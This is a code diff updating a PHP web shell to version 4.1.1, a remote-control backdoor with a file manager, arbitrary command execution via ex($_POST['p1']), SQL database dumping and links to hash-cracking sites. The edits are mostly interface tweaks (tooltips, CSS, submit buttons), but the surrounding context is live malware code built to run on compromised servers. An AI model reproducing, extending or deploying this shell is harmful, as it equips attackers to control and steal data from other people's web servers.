@@ -24,7 +24,7 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.1.0');
+@define('VERSION', '4.1.1');
 if(get_magic_quotes_gpc()) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -71,15 +71,20 @@ function hardHeader() {
 	div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
 	a			{text-decoration:none;}
 	a:hover		{text-decoration:underline;}
+	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
+	.tooltip:hover::after {opacity:1;visibility:visible;}
 	.ml1		{border:1px solid #1e252e;padding:5px;margin:0;overflow:auto;}
 	.bigarea	{width:100%;height:250px; }
 	input, textarea, select	{margin:0;color:#fff;background-color:#1e252e;border:1px solid #060a10; font:9pt Courier New;outline:none;}
 	form		{margin:0px;}
 	#toolsTbl	{text-align:center;}
+	#fak 		{background:none;}
+	#fak td 	{padding:5px 0 0 0;}
 	.toolsInp	{width:300px}
 	.main th	{text-align:left;background-color:#060a10;}
 	.main tr:hover{background-color:#354252;}
 	.main td, th{vertical-align:middle;}
+	input[type='submit']:hover{background-color:#0663D5;}
 	.l1			{background-color:#1e252e;}
 	pre			{font:9pt Courier New;}
 </style>
@@ -687,7 +692,7 @@ function add(cmd) {
 		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
 	}
 	
-	echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
+	echo '</select><input type=submit onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
 	if(!empty($_POST['p1'])) {
 		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
 	}
@@ -905,10 +910,10 @@ echo "<script>
 	$l = 0;
 	foreach($files as $f) {
 		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
-			.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
+			.'</td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a class="tooltip" data-tooltip="Edit" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
 		$l = $l?0:1;
 	}
-	echo "<tr><td colspan=7>
+	echo "<tr id=fak><td colspan=7>
 	<input type=hidden name=ne value=''>
 	<input type=hidden name=a value='FilesMan'>
 	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
@@ -919,7 +924,7 @@ echo "<script>
     echo "<option value='tar'>+ tar.gz</option>";
     if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
         echo "<option value='paste'>↳ Paste</option>";
-    echo "</select>&nbsp;";
+    echo "</select>";
     if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
         echo "file name: <input type=text name=p2 value='hard_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
     echo "<input type='submit' value='>>'></td></tr></form></table></div>";
@@ -1003,13 +1008,13 @@ function actionStringTools() {
 		<form method='post' target='_blank' name='hf'>
 			<input type='text' name='hash' style='width:200px;'><br>
             <input type='hidden' name='act' value='find'/>
-			<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
-			<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
-            <input type='button' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
-			<input type='button' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
-			<input type='button' value='tools4noobs.com' onclick=\"document.hf.action='http://www.tools4noobs.com/online_php_functions/';document.hf.submit()\"><br>
-			<input type='button' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
-			<input type='button' value='artlebedev.ru' onclick=\"document.hf.action='https://www.artlebedev.ru/tools/decoder/';document.hf.submit()\"><br>
+			<input type='submit' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
+			<input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
+            <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
+			<input type='submit' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
+			<input type='submit' value='tools4noobs.com' onclick=\"document.hf.action='http://www.tools4noobs.com/online_php_functions/';document.hf.submit()\"><br>
+			<input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
+			<input type='submit' value='artlebedev.ru' onclick=\"document.hf.action='https://www.artlebedev.ru/tools/decoder/';document.hf.submit()\"><br>
 		</form></div>";
 	hardFooter();
 }
@@ -1470,7 +1475,7 @@ echo ">PostgreSql</option></select></td>
 					$value = htmlspecialchars($value);
 					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";
 				}
-				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
+				echo "<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
 				if(@$_POST['p1'] == 'select') {
 					$_POST['p1'] = 'query';
                     $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
